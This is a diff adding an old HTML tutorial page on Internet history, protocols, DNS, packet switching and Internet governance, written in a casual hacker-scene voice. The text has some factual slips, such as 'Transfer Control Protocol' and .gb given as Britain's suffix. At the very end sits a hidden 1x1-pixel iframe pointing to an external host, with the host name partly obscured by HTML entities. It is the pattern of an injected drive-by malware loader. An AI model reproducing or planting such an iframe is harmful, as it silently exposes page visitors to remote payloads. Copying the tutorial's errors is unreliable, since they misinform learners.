@@ -1,0 +1,368 @@
+
+<HTML><HEAD><TITLE>Internet Architecture, Network Concepts and Facts</TITLE>
+</HEAD>
+<BODY text=#cccccc vLink=#0099cc aLink=#66ccff link=#99ccff bgColor=#000000 
+leftMargin=20 topMargin=20 marginheight="20" marginwidth="20">
+<CENTER>
+<p></p>
+</CENTER>
+<P align=center><FONT face="Verdana, Arial, Helvetica, sans-serif" color=#999999 
+size=1>================================================</FONT><FONT 
+face="Verdana, Arial, Helvetica, sans-serif" size=2><BR><B><FONT 
+color=#ffffff>Internet Architecture, Network Concepts and 
+Facts<BR></FONT></B></FONT><FONT face="Verdana, Arial, Helvetica, sans-serif" 
+color=#999999 
+size=1>================================================<BR></FONT>
+<FONT face="Verdana, Arial, Helvetica, sans-serif" 
+color=#999999 
+size=2>Written by <a href="mailto:rammal81@hotmail.com">Mikkkeee</a><br>
+For<br>
+<a href="http://blacksun.box.sk/">http://blacksun.box.sk/</a><br>
+and <br>
+<a href="http://www.securitywriters.org">http://www.securitywriters.org</a></FONT></FONT></P>
+<P align=left><FONT face="Verdana, Arial, Helvetica, sans-serif" 
+size=2><BR><BR><FONT 
+color=#ffffff><B>OverView<BR></B></FONT><FONT color=#999999 
+size=1>==========<BR></FONT>------------------------------------------------------<BR><BR><FONT 
+color=#ffffff><B>1. <a href="#summary">Short 
+summary on the history of the Internet (boring yet 
+vital)</a><BR><BR></B></FONT></FONT><B><FONT 
+face="Verdana, Arial, Helvetica, sans-serif" color=#ffffff size=2>2.<a href="#jargon"> Internet 
+Protocols and Jargon </a> <BR><BR>3. <a href="#host">Host 
+Machines and Host Names</a><BR><BR>4. <a href="#packet">Architecture 
+of the Internet and Packet Switching</a><BR><BR>5. <a href="#band">Synchronous 
+and Asynchronous Communication</a><BR><BR>6. <a href="#charge">Who 
+is in Charge? (boring yet vital)</a><BR><BR>7. <a href="#future">The 
+future of the Internet</a><BR><BR>8. <a href="#read">Further 
+reading </a> <BR><BR></FONT></B><FONT 
+face="Verdana, Arial, Helvetica, sans-serif" 
+size=2>------------------------------------------------------<BR><BR></FONT><FONT 
+face="Verdana, Arial, Helvetica, sans-serif" size=2><BR>This text won't make you 
+an elite hacker or a cracker, but will clear up many misunderstandings you might 
+have about the Internet and the way it is structured. Okay before you start 
+reading, i will be summarizing most of this info because many other tutorials 
+have been written in detail explaining the sections presented. This is just 
+another way to say, IAM NOT GOING TO WASTE MY TIME TYPING. So i see you have 
+downloaded this text to learn more about the wonderful tool the world has ever 
+seen, but do you really understand the juicy info behind the Internet? Well 
+after reading this you will!<BR><BR><BR><FONT color=#ffffff><B><A 
+name=summary></A>1: Summary on the history of the Internet (boring yet 
+vital)<BR></B></FONT><B></B><BR><BR>Well every place i go i keep hearing ppl 
+saying things like i was chatting, or i sent him/her an email, or i was checking 
+his site on the INTERNET. Now when you are asked what is the Internet? you 
+reply, Well the Internet is like a program i write a www.blahblah.com and i see 
+stuff and i download it, not hard, probably took days to do, well someone is 
+wrong, heheheh.<BR><BR>The Internet is a global assemblage of more than 20 
+million computers and growing in rapid intercommunication. These forms of 
+communication links are made up of optical fibers, digital cables, satellite 
+transmissions, and yup you guessed it, telephone lines. The Internet can be 
+described in three terms, the hardware infrastructure that supports it, the 
+software that powers it, and the people who populate it. <BR><BR>When the 
+Internet began, until the early 90s, the only guys who used it weren't normal 
+ppl, but they were the scientists, academics, science students and the real deal 
+computer programmers who were pursuing long-distance collaborations and 
+research. The Internet isn't something that just popped out of nowhere, it has 
+been around for decades, but was something overlooked by the media until 1990. 
+Well the origin of the Internet dates back to 1970, when four computers, yes 
+four, one each at The University of California at Los Angeles, The University of 
+California at Santa Barbara, The Stanford Research Institute, and The University 
+of Utah at Salt Lake City were hooked up over phone lines. <BR><BR>From the 
+first four computers that powered the first Internet, 13 years later 562 boxes 
+were connected to it in 1983, and by 1993 that number has reached 1.2 million 
+and in 1996 it was 12 million, and this number remains doubling every 12-14 
+months. One critical component underlying today's Internet is the software that 
+supports network communications. In the Internets's beginning dayz, the software 
+that powered the networks wasn't user friendly, they didn't have fancy crap with 
+popup menus and fancy Graphical User Interfaces (GUI), they had cryptic programs 
+which looked like hell for normal people. One reason for this is because the 
+only people who used the net were scientists who didn't care about user friendly 
+interfaces. The software they designed was difficult, which hindered the 
+popularity of the net. <BR><BR>The first tools that these cool guys made that 
+innovated the Internet were, Telnet, yup the good old telnet, which was made in 
+1969 and second, the File Transfer Protocol (ftp), which was made in 1971 and is 
+still in great use today. (i wasn't born yet, heh) Other popular communication 
+programs have also evolved with the Internet, which are know by the names of: 
+Usenet Newsgroups, Internet Relay Chat (IRC), Gophers, and Multi-user Dungeons 
+(MUD's).<BR><BR><BR><B><FONT color=#ffffff><A name=jargon></A>2: Internet 
+Protocols and Jargon (what those 3 letter words mean)</FONT></B> <BR><BR><BR>We 
+computer guys tend to speak in acronyms, small words that have a lot of valuable 
+info. Acronyms are ubiquitous on the Internet, and all this wonder will be 
+explained here. <BR><BR>Many Internet acronyms involve a "P" letter. Lets look 
+at these, we have, SLIP, TCP, UDP, FTP, ICMP, SMTP, HTTP, PPP, IP, and Mikkkeee 
+(only playing). Okay now you have witnessed the confusion, what does all this 
+stuff mean. All of them stand for the word "protocol." So when ever you see a 
+"P" at the end of a computer acronym, there is a big chance its stands for 
+protocol. Now the tough part is what is this protocol? Well a protocol in 
+computer science just refers to formalities and conventions observed by 
+computers during cross computer communication. So its just like this, in order 
+for boxes to share data, each box must use the same data transfer rules, or we 
+won't have communication. Just like the old dayz when ppl used the telegraph, 
+which communicated through the communication protocol called the Morse code. 
+Then came the Ham radio operators who also had their protocols and now we have 
+the Internet, which also needs its little protocols. <BR><BR>(Now I am not going 
+to kill you via boredom by explain the concept of protocols because they are 
+already explained by the tutorials found at BSRF, but i will sprinkle the 
+sprinkles on the cake.) <BR><BR>The Internet Protocol (IP) is the cornerstone 
+for all Internet communications. In fact, you can see if a box is alive (on the 
+net) by asking for its IP, yah not going far as to doing something lame as 
+DoSing the box! Now each computer on the Internet has a unique IP number that 
+operates as its Internet address. When we say that there are 20 million 
+computers on the Internet, that figure is really based on the number of IP 
+addresses in use in that year. <BR><BR>As you have begun to browser the net, or 
+start your mission in becoming a hacker, you will most likely come across some 
+reference to the Transfer Control Protocol/Internet Protocol(TCP/IP). TCP is 
+nothing to be feared, it works closely with IP in order to prepare packets of 
+data before an Internet data transfer. TCP also interprets those same packets at 
+the receiving end after the transfer. <BR><BR>Additional protocols are also used 
+to power the net. These are, the File Transfer Protocol (FTP), which moves filz 
+from one computer to another. The Simple Mail Transfer Protocol (SMTP) designed 
+in 1982 to support e-mail communications. The HyperText Transfer Protocol 
+(HTTP), made in 1990 so that web browsers could read documents on the 
+web.<BR><BR>The Point-to-point protocol (PPP) and the Serial Line Internet 
+Protocol (SLIP), which generally are terms used if you need to set up access to 
+the Internet over a telephone line through an Internet Service Provider (ISP). 
+These protocols are used when a computer wants to communicate over the Internet, 
+over a serial transmission line, like an analog telephone line, and the user 
+wants to use a browser such as Internet Explorer. So his isp will offer a ppp or 
+a slip account to the users who want to view graphics on the net. (Now you might 
+have noticed that I didn't go in depth but for further information on protocols 
+check out the tuts at bsrf for further info.) <BR><BR><BR><B><FONT 
+color=#ffffff><A name=host></A>3: Host Machines and Host 
+Names<BR></FONT></B><FONT color=#ffffff></FONT><BR><BR>Now to gain good 
+knowledge on how the net works you will need to know something about host 
+machines/host names. <BR><BR>Now a computer that has been assigned an IP address 
+is called a HOST MACHINE. Each IP address is made up of four integers separated 
+by periods. Lets take an example, my ip on the net yesterday was 150.211.39.128 
+just like zip codes tell a person where you live, IP addresses reveal not your 
+geographical info, but your computer network's info. Now the numbers to the 
+furthermost part to the left represent the large part of the Internet, while the 
+numbers to the further part of the right represent a specific host machine. 
+<BR><BR>While all these numbers are fine for computer communications, long 
+strings of numbers are not easy for us to remember so that's why we have 
+substituted the long strings of numbers into symbolic names. Symbolic names look 
+like this www.yahoo.com, which is easier to remember. Symbolic host names are 
+always converted into their IP addresses for the purpose of network 
+communications. The Domain Name Service (DNS) is responsible for this task of 
+mapping symbolic names to their numerical equivalents, and symbolic host names 
+are often called DNS names or addresses. Lets look at an example, DNS names, 
+follow certain naming conventions that help us remember the names easily. so we 
+have <BR><BR></FONT></P><PRE><FONT face="Verdana, Arial, Helvetica, sans-serif" size=2> 
+ " blah.cs.NYU.edu "
+       |    |     |     |    
+       |    |     |     |---&gt;  this segment refers to an educational site.
+       |    |     |--------&gt;  this part stands for the school, here its NYU University.<BR>       |    |-------------&gt;  this stands for Computer Science Department.      
+       |-----------------&gt;  this stands for the name of the machine.
+
+   </FONT></PRE>
+<P><FONT face="Verdana, Arial, Helvetica, sans-serif" size=2>ohh one more thing, 
+sometimes lamers talk about "HIGH LEVEL DOMAIN NAMES" so they think they are so 
+smart well they are only referring to the final part of the full domain name. 
+This means a high level domain name identifies the type of site and where the 
+host machine resides. Here is a 
+list:<BR><BR><BR>-------------------------------------------<BR>.com = a 
+commercial organization<BR>.edu = an educational site<BR>.org = a nonprofit 
+organization <BR>.net = a network site<BR>.gov = a government agency<BR>.mil = a 
+military site <BR><BR>These high level domain names can in many cases be 
+followed by other suffixes, that will identify their geographical location by 
+country. This list is very small, (ahh again a complete list can be found at 
+BSRF) blahblah.net.lk = Sri Lanka blahblah.net.il = Isreal blahblah.net.gb = 
+Great Britain okay that's 
+enough!<BR>-------------------------------------------<BR><BR><BR><B><FONT 
+color=#ffffff><A name=packet></A>4: Architecture of the Internet and Packet 
+Switching <BR></FONT></B><FONT color=#ffffff></FONT><BR><BR>Well while you 
+browse the Internet you might think every computer on it is equal well your 
+wrong, not all computers are equal. Well to understand what i mean i have to 
+explain to you how data gets moved across the Internet by PACKET 
+SWITCHING.<BR><BR>In order to understand packet switching you will have to 
+understand what packet switching tries to achieve. When the Department of 
+Defense was paying for the original network research that led to the Internet, 
+they wanted a strong network that could withstand regional power blackouts or 
+other problems. So in order to achieve such a robust communication, it was vital 
+to design a transmission protocol that could readily find new routes if its 
+destination was dead for some reason. So those guys came up with a cool plan to 
+design a form of DYNAMIC ROUTING, which will become the standard means of moving 
+data across the network. Dynamic Routing just means that routes for data are 
+always selected at the time of transmission, after taking current network 
+conditions into consideration. <BR><BR>The network designers also felt it was 
+important to distribute route-selection capabilities throughout the network, so 
+that no single site was responsible for the entire network. Let me explain this 
+further, lets say like a network was designed " hierarchically " so that 
+everything passes through that central routing site, so if anything happens to 
+that central routing site well HOUSTON WE GOT A PROBLEM! <BR><BR></FONT></P><PRE><FONT face="Verdana, Arial, Helvetica, sans-serif" size=2>This is how a hierarchically network would look like:
+<BR>
+<BR><FONT size=1>----------------------------------------------------------------------------<BR></FONT>                            ___<BR>                           |___|
+                           / \ / \       Well you can clearly see that the
+                          /  /\   \      big box is the central routing site 
+                        O O O  O    so if anything happens to the big <BR>                                          box then we got a big problem.
+
+<FONT size=1> </FONT></FONT><FONT face="Verdana, Arial, Helvetica, sans-serif" size=2><FONT size=1>----------------------------------------------------------------------------</FONT></FONT>
+</PRE>
+<P><FONT face="Verdana, Arial, Helvetica, sans-serif" size=2>So since these guys 
+were very smart they built the Internet in "heterarchically," which really means 
+instead of having one central routing site, there are a large number of routing 
+sites distributed all over the network. The hosts that decide how to route 
+transmissions across the Internet are called ROUTERS. The Internet today is 
+currently being run by thousands of these hosts called routers. 
+<BR><BR></FONT></P><PRE><FONT face="Verdana, Arial, Helvetica, sans-serif" size=2><FONT size=1> </FONT></FONT><FONT face="Verdana, Arial, Helvetica, sans-serif" size=2><FONT size=1>---------------------------------------------------------------------------------</FONT></FONT><BR><FONT face="Verdana, Arial, Helvetica, sans-serif" size=2>
+                          O-O     Okay the art sucks but you see the idea
+                        / -O- \    there isn't one box there are many hosts<BR>                       O-----O   so if one dies, others can still work
+                         \ O /
+<FONT size=1> </FONT></FONT><FONT face="Verdana, Arial, Helvetica, sans-serif" size=2><FONT size=1>---------------------------------------------------------------------------------</FONT></FONT><FONT face="Verdana, Arial, Helvetica, sans-serif" size=2> </FONT></PRE>
+<P><FONT face="Verdana, Arial, Helvetica, sans-serif" size=2>So now you figured 
+out the difference, dynamic heterarchical routing is what makes the Internet 
+work so good, and the key idea that binds everything together is packet 
+switching. All of the data moved across the Internet is moved in units called 
+PACKETS. The traffic on the net is measured by counting the packets transferred 
+in a period of time. <BR><BR>If this concept is hard for you to understand let 
+me explain. Lets say you are downloading a file from a server in California to 
+your box in New York. The software running on the server breaks the huge file 
+into packets. Lets say your file was 100k it might be broken down info 6 or 7 
+packets, then each packet is stamped with the IP address of its destination, as 
+well as the IP address of the originating host. Packets will also be given 
+instructions, these instructions describe the size of the original transmission 
+and where each specific packet should be positioned when the original 
+transmission is put together when it gets to my computer. Now the big deal is 
+that each packet is sent out onto the Internet to find its way to the 
+destination address. This means that the 6 or 7 packets don't have to travel 
+together so they can go from California to other parts of the country then they 
+find their way to New York. The packets are first given to a router, which looks 
+at their destination address and decides where to send the packets. Now the 
+router at that location then does the same thing. So when all the packets come 
+to New York, they are then assembled into a single file. Each packet is checked 
+first to see if it has arrived intact. If there was an error in a packet then a 
+request to resend that packet is sent to the originating host. This form of 
+sending files is the best way to work on a net, because it minimizes network 
+load and by sending small packets the destination won't have to wait for the 
+whole file to be sent if it had errors. Every computer running on the Internet 
+uses this form of data transfer. <BR><BR><BR><B><FONT color=#ffffff>Important 
+newbie fact <BR></FONT></B><FONT color=#ffffff></FONT><BR><BR>Well if your 
+reading this you probably were alive in 1996, well what's the big deal you ask, 
+lets put this concept of packet switching into the real world. On August 7, 
+1996, 6 million AOL customers were unable to access the Internet because AOL had 
+recently loaded new software onto its network routers. This software contained 
+incorrect routing information. As a result, AOL couldn't route packets on or off 
+its gateway hosts. The 6 million guys waiting soon found out that their aol 
+service was interrupted and for 19 hours these guys couldn't surf the net. Now 
+since only AOL had this problem, the rest of the world who are smart enough not 
+to use aol were checking their email and chatting and visiting sites, thanks to 
+the architecture of the net not all of us suffered. <BR><BR><BR><B><FONT 
+color=#ffffff><A name=band></A>5: Bandwith and Asynchronous Communication 
+<BR></FONT></B><FONT color=#ffffff></FONT><BR><BR>Okay, you're probably saying 
+what's this topic Mike? Its nothing to fear, i'll explain in simple English a 
+little child can understand. <BR><BR>Online communication takes some time for 
+normal people to understand or to just get used to. In the world you live in 
+called off-line world communication is dominated by two way, real time 
+communication, ie. you and a friend talking. This conversation is being operated 
+in two directions, with questions/answers being talked about right away. Now in 
+the computer sphere, a two way communication mediated by shared signals for 
+beginning/ending conversations is called SYNCHRONOUS communication. Synchronous 
+communication is like normal human/animal conversation. This form of 
+communication relies on shared signals for starting and stopping. Examples of 
+this communication would be like your browser sending a msg to a host and the 
+host sends you something, a packet or a file. Programs which deal with this 
+communication are software found on your box, Cu-Cms and RealVideo are some, 
+which allow internet users with properly equipped hosts to converse with other 
+internet users through a video channel. Problems arise in this form of 
+communication, because as both of us know if you don't have the bandwidth, you 
+will be staring at a video box with images that are jerky and stroboscopic 
+(images which look like garbage). <BR><BR>When a communication exchange does not 
+rely on shared signals for starting and stopping, this communication is called 
+ASYNCHRONOUS communication. Now your probably confused but don't be. This form 
+of communication seen online is characterized by long waits for responses. This 
+communication is seen in email messages which take some people forever to answer 
+back. This doesn't have anything to do with the servers or the bandwidth, but 
+has to do with the human being on the other side. Email messages are delivered 
+in a matter of seconds, but there is no guarantee that an intended recipient 
+will be ready and waiting to reply as soon as your message is received. So the 
+reason for this is that it pays to think about what your are saying and how your 
+saying because it will affect the outcome of the asynchronous communication. 
+<BR><BR><BR><B><FONT color=#ffffff><A name=charge></A>6: Who is in 
+Charge?</FONT></B><BR><BR><BR>Your probably wondering, yeah I always wanted an 
+answer to that question, so explain to me plz. hehe! <BR><BR>Okay I am not going 
+to lie to you, questions about Internet management and maintenance are very 
+boring so bare with me. You might also want to ask who pays for all this? Who 
+fixes it when it messes up? Who is responsible for keeping everything working? 
+Who makes the decisions about the future of this wonderful tool? Well I'll 
+answer everything right here. <BR><BR>As I explained in the previous parts of 
+this text, the net is composed of thousands of smaller networks that are 
+independent from one another, remember the heterarchical structure,heh. Now 
+these smaller networks are managed by corporations, government agencies and 
+universities with different hardware platforms and different network 
+technologies. Now you see that I am going back and all these small and large 
+networks are held together by a wonderful glue called TCP/IP. But I see your 
+going to ask, okay, cool but what holds it together administratively, like how 
+can this huge tool have no central authority? Okay let me answer your question, 
+remember when i told you that the Internet was made by scientists and 
+programmers, well those guys have always pushed the spirit of this wonderful 
+tool. So when these guys made up TCP/IP they made it public so that TCP/IP could 
+be placed on any hardware platform. Now the Department of Defense had a large 
+part in this deal but like the Department of Defense, the university researchers 
+also did a lot, and like the rest they also made their finding public. By doing 
+this anyone who had access to the internet, could access these documents and put 
+their own influence into the development of the net. Now you might think that 
+all this public stuff is done with, well not. This way of life is still managed 
+by a group that oversees the continuing growth of the Internet, this group is 
+called, INTERNET SOCIETY (ISOC). This organization oversees a number of smaller 
+groups also pursuing the growth of the net. These groups are: <BR><BR><B>- 
+Disaster Assistance Committee <BR>- Internet Operations Forum <BR>- Internet 
+Architecture Board (IAB) <BR>- Internet Engineering Task Force (IETF) <BR>- 
+Internet Assigned Number Authority (IANA) <BR>- Internet Engineering Steering 
+Group (IESG) <BR>- Internet Research Task Force (IRTF) <BR>- k-12 Committee 
+<BR></B><FONT color=#ffffff></FONT><BR>ISOC has no sanction or governmental 
+power so it operates as a resource for ppl who want to participate in the growth 
+of the net. <BR><BR>The Internet's high-speed backbone is a key component of the 
+net, and many different organizations have said they are responsible for 
+maintaining the backbone. In the 70's, research parties funded by the Advanced 
+Research Projects Agency (ARPA) were given access to ARPAnet. In the late 70's, 
+the National Science Foundation (NSF) joined with ARPA to create a network that 
+would be more available for computer scientists in the US. NSF then gave birth 
+to CSnet in 1979. In 1982, a gateway was established between ARPAnet/CSnet, 
+which demonstrated the viability of a network of networks like a small version 
+of the Internet. After the joining of ARPAnet/CSnet, the term "INTERNET" was 
+then adopted. <BR><BR>By 1983, more networks began to do the same thing by 
+expanding/establishing their own user communities. In San Francisco, FidoNet 
+connected FidoBBS (Bulletin Board Systems) across the nation so that many users 
+of local bulletin boards could exchange messages by email/discussion groups. In 
+the same year, the Department of Defense switched all of its military networks 
+to the TCP/IP protocol. By then, TCP/IP software was only included in all UNIX 
+software distros out of the University of California at Berkley. UNIX was the 
+operating system of choice for computer scientist, and it still is, so by doing 
+this a huge jump was put in Internet expansion. <BR><BR>BY 1985 the Internet was 
+further expanded when NSF became a leader in network communication and they got 
+funding from Congress to join 100 more universities to the Internet. By doing 
+this NSF then connected five supercomputer sites in a new network called NSFnet. 
+With all these costs and further spending the Federal Government, soon realized 
+it couldn't afford to subsidize the Internet. So now it became a private 
+industry. So the firms which made up the NSFnet backbone (IBM, MCI, MERIT) 
+created a nonprofit company called Advanced Networks and Services (ANS). Then in 
+1992, ANS built a new backbone, ANSnet, with 30 times the bandwidth of the old 
+NSFnet backbone. ANSnet is the current backbone for the Internet and the first 
+one not maintained by the government but by private companies. <BR><BR>Now since 
+your probably bored and confused, let me finish off, since no federally 
+sponsored organization oversees everything, there are some which monitor some 
+parts. Lets look at Federal Communication Commission (FCC) they don't have any 
+authority over the net, but they do regulate the billing practices of telephone 
+companies. This is really cool, cause the FCC does not allow phone companies to 
+bill ppl for digital communication differently than they do for voice 
+communication. So the main deal is this, the net is operated by small spheres 
+and ppl who impose on themselves to censor stuff or to protect ppl from the bad 
+sides of the net. <BR><BR><BR><B><FONT color=#ffffff><A name=future></A>7: The 
+future of the Internet <BR></FONT></B><FONT color=#ffffff></FONT><BR><BR>Well I 
+am going to let you do some work now. Since you just read the info on the net 
+how big you think the info on Internet2 is going to be. let me give you a hint, 
+it is going to be big. At the moment, a new upgraded version of the internet is 
+in development, and its going to be called Internet 2 or simply I2. This will be 
+a heaven when its complete so with out further interruption I have made a site 
+dedicated to Internet 2. The site is good enough and is still up to date. Chk 
+out the links for further news on it. The url of the site is <A 
+href="http://i2.virtualave.net/">http://i2.virtualave.net/</A> ahh man i forgot 
+to kill the banners, well enjoy!!!<BR><BR><BR><B><FONT color=#ffffff><A 
+name=read></A>8: Further reading </FONT></B><BR><BR><BR>Okay I have chosen some 
+books if you want to learn more, cause you know in 3 decades i summarized them 
+in 7 or 8 pages so i think you might want to read more. <BR><BR>Good books to 
+read. <BR><BR>Where Wizards Stay up Late, by Katie Hafner and matthew Lyon. 
+Simon and shuster, New York, NY, 1996. (304 pages) <BR><BR>Being Digital, by 
+Nicholas Negroponte. Vintage Books, New York, Ny, 1995. (255 pages) <BR><BR>The 
+Internet 1997 Unleashed, by Jill Ellsworth and Billy Baron (Eds)Sams.net 
+Publishing, Indianapolis, IN, 1996. (1,269 pages) </FONT></P><iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</BODY></HTML>
